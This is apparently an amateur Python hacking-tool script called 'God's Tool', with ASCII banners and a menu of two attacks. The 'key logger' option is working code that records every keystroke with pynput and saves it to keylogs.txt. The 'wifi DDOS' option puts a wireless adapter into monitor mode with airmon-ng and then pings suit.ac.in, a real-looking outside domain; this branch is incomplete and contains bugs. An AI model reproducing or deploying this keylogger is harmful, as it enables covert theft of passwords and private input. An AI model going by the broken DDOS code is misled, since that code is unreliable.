import os
import subprocess
subprocess.run('ls')

print("""

░██████╗░░█████╗░██████╗░██╗░██████╗  ████████╗░█████╗░░█████╗░██╗░░░░░
██╔════╝░██╔══██╗██╔══██╗╚█║██╔════╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
██║░░██╗░██║░░██║██║░░██║░╚╝╚█████╗░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║░░╚██╗██║░░██║██║░░██║░░░░╚═══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
╚██████╔╝╚█████╔╝██████╔╝░░░██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
░╚═════╝░░╚════╝░╚═════╝░░░░╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
""")
print("Before running script run the command - $pip install -r requirements.txt")

print("""
1.key logger
2.wifi DDOS
""")

# selecting of attack
print("Select the tools: ",end="")
switch =int(input())
if (switch == 2):
  home_dir = os.system("cd ~")
  subprocess.run('clear')
  print("""
  
░██████╗░░█████╗░██████╗░██╗░██████╗  ██████╗░██████╗░░█████╗░░██████╗
██╔════╝░██╔══██╗██╔══██╗╚█║██╔════╝  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██╗░██║░░██║██║░░██║░╚╝╚█████╗░  ██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░╚██╗██║░░██║██║░░██║░░░░╚═══██╗  ██║░░██║██║░░██║██║░░██║░╚═══██╗
╚██████╔╝╚█████╔╝██████╔╝░░░██████╔╝  ██████╔╝██████╔╝╚█████╔╝██████╔╝
░╚═════╝░░╚════╝░╚═════╝░░░░╚═════╝░  ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
  """)
  #Put Wi-Fi Adapter in Monitor Mode with Airmon-Ng
  p1 = subprocess.run('airmon-ng start wlan0',stdout=subprocess.PIPE, text=True)
  print(p1.stdout.decode())
  
  #Capture Traffic with Airodump-Ng
  p2 = subprocess.run('ping suit.ac.in',stdout=subprocess.PIPE, text=True)
  print(p2.stdout.decode())
  


elif(switch == 1):
  subprocess.run('clear')
  print("""
  
░██████╗░░█████╗░██████╗░██╗░██████╗  ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██╔════╝░██╔══██╗██╔══██╗╚█║██╔════╝  ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
██║░░██╗░██║░░██║██║░░██║░╚╝╚█████╗░  █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██║░░╚██╗██║░░██║██║░░██║░░░░╚═══██╗  ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
╚██████╔╝╚█████╔╝██████╔╝░░░██████╔╝  ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
░╚═════╝░░╚════╝░╚═════╝░░░░╚═════╝░  ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
  """)
  home_dir = os.system("cd ~")
  p2 = subprocess.run('pwd',stdout=subprocess.PIPE, text=True)
  print(p2.stdout)
   
  
  
  from pynput.keyboard import Key, Listener
  import logging

  log_dir = ""

  logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

  def on_press(key):
      logging.info(str(key))

  with Listener(on_press=on_press) as listener:
      listener.join()

  
    
